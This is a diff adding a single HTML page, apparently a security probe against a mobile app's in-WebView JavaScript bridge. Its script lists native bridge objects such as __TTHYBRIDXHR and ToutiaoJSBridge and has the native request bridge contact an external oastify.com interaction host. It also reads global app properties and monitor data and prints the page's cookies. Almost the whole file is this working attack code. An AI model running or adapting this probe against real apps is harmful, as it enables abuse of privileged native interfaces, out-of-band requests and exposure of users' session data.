@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{margin:0;padding:8px;background:#111;color:#0f0;font:13px monospace;word-break:break-all}
+pre{white-space:pre-wrap}
+</style>
+</head>
+<body>
+<pre id="o"></pre>
+<script>
+var o=document.getElementById('o'),L=[];
+function a(m){L.push(String(m));o.textContent=L.join('\n');}
+a('=== H8 JSB Probe ===');
+a('URL: '+location.href.substring(0,150));
+a('ORIGIN: '+location.origin);
+a('');
+a('--- JSB Objects ---');
+var names=['__TTHYBRIDXHR','WIReport','iesJsBridgeTransferMonitor','__globalprops','BDXBridge','ToutiaoJSBridge'];
+names.forEach(function(x){
+  try{
+    var t=window[x];
+    if(t){
+      var m=[];
+      for(var k in t) if(typeof t[k]=='function') m.push(k);
+      try{Object.keys(t).forEach(function(k){if(m.indexOf(k)<0&&typeof t[k]=='function')m.push(k);});}catch(e){}
+      a('[OK] '+x+' ['+m.join(',')+']');
+    }else a('[NO] '+x);
+  }catch(e){a('[ERR] '+x+' '+e.message);}
+});
+a('');
+a('--- Call Tests ---');
+if(window.__TTHYBRIDXHR){
+  try{
+    window.imy_cb=function(i,r){
+      a('[CB] id='+i+' status='+(r&&r.status));
+      if(r) a('[CB] headers='+JSON.stringify(r.headers||{}).substring(0,500));
+      a('[CB] body='+JSON.stringify(r).substring(0,400));
+      o.textContent=L.join('\n');
+    };
+    var r=__TTHYBRIDXHR.postMessage(JSON.stringify({
+      url:'https://nvmbwl14jwh72qwixi1ghcq5cwin6ex2m.oastify.com/get?probe=1',
+      method:'GET',
+      headers:{},
+      data:'',
+      id:'probe1'
+    }));
+    a('[XHR] postMessage='+r);
+  }catch(e){a('[XHR ERR] '+e.message);}
+}else{
+  a('[XHR] __TTHYBRIDXHR not found');
+}
+a('');
+if(window.__globalprops){
+  try{
+    a('[GP] '+String(__globalprops.getGlobalProps()).substring(0,500));
+  }catch(e){a('[GP ERR] '+e.message);}
+}else{
+  a('[GP] __globalprops not found');
+}
+a('');
+if(window.iesJsBridgeTransferMonitor){
+  try{
+    a('[MON] '+String(iesJsBridgeTransferMonitor.getInfo()));
+  }catch(e){a('[MON ERR] '+e.message);}
+}else{
+  a('[MON] iesJsBridgeTransferMonitor not found');
+}
+a('');
+try{
+  a('[COOKIE] '+(document.cookie||'empty'));
+}catch(e){
+  a('[COOKIE] blocked: '+e.message);
+}
+a('');
+a('--- DONE ---');
+</script>
+</body>
+</html>
